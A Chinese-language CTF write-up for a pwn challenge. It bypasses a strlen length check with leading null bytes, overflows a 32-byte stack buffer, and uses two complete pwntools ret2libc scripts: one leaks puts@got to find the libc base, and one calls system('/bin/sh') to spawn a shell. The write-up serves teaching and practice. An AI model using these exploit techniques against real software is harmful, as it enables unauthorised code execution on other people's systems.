# 我后门呢

## 题目简述

`main` 中的 `input[0x20]` 只占 32 字节，`read(0, input, 0x100)` 可覆盖返回地址。随后程序用 `strlen(input) > 0x20` 阻止长字符串，但 `strlen` 遇到首个 `\0` 就停止，因此让载荷以空字节开头即可在保留溢出的同时绕过长度检查。题目提供配套 libc，适合使用两阶段 ret2libc。

## 解题过程

第一阶段用 `puts@plt` 输出 `puts@got` 保存的真实函数地址，再返回 `main` 获得第二次输入机会。由泄露地址减去配套 libc 中 `puts` 的偏移即可得到 libc 基址：

```python
from pwn import *

context(arch="amd64", os="linux")
io = process("../dist/ret2libc")
elf = ELF("../dist/ret2libc")
libc = ELF("../dist/libc.so.6")

pop_rdi = 0x401333

stage1 = flat(
    b"\x00" * 0x20,  # strlen(input) == 0
    0x404000,          # 覆盖保存的 rbp
    pop_rdi, elf.got["puts"],
    elf.plt["puts"],
    elf.sym["main"],
)
io.sendlineafter(b"input:\n", stage1)
io.recvline()
leak = u64(io.recvline().rstrip(b"\n").ljust(8, b"\x00"))
libc.address = leak - libc.sym["puts"]
```

第二阶段可调用 `system("/bin/sh")`。`next(libc.search(b"/bin/sh\x00"))` 在已设置基址的 libc 中返回运行时地址：

```python
ret = 0x40101A  # 必要时用于 16 字节栈对齐
bin_sh = next(libc.search(b"/bin/sh\x00"))

stage2 = flat(
    b"\x00" * 0x20,
    0x404000,
    ret,
    pop_rdi, bin_sh,
    libc.sym["system"],
)
io.sendlineafter(b"input:\n", stage2)
io.interactive()
```

GOT 泄露成立的原因是动态链接器在函数解析后把真实 libc 地址写入对应表项；题目在泄露前已经调用过 `puts`，因此 `puts@got` 可直接使用。

## 方法总结

本题把 C 字符串终止规则与栈溢出结合在一起：`read` 按字节数写入，`strlen` 却只统计第一个 NUL 之前的内容。ret2libc 的通用流程是“泄露已知符号地址—计算库基址—调用库中目标函数”，并要使用题目提供的同版本 libc、校验泄露边界及 ABI 栈对齐。
